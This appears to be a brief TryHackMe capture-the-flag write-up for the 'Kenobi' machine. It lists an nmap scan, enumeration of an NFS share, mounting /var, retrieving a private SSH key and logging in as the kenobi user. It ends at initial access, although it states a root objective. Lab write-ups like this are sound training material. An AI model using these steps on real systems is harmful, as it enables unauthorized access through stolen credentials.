# TryHackMe - Kenobi Write-Up

## *1. Overview*
- *Target Machine:* Kenobi (TryHackMe)
- *Objective:* Gain root access and retrieve the flag.
- *Techniques Used:* Enumeration, NFS Exploitation, Privilege Escalation.

---

## *2. Enumeration*
### *2.1 - Nmap Scan*
First, I ran a full port scan using nmap:  


nmap -sC -sV -p- -oN scan.txt <Target_IP>


Findings :





![Image](https://github.com/user-attachments/assets/175fc8e7-85e4-4ebb-bc50-fdcf8717a52b)

## 3. Exploitation

### 3.1 - Exploiting NFS

bash


showmount -e <Target_IP>



•	Found /var directory as a shared NFS mount.


•	Mounted the share on my local

bash



 sudo mount -o nolock <Target_IP>:/var /mnt


 •	Discovered a private SSH key in /mnt/.ssh/id_rsa.

 ### 3.2 - Gaining initial access

 bash


 chmod 600 id_rsa

 
ssh -i id_rsa kenobi@<Target_IP>


•	Logged in as kenobi user.














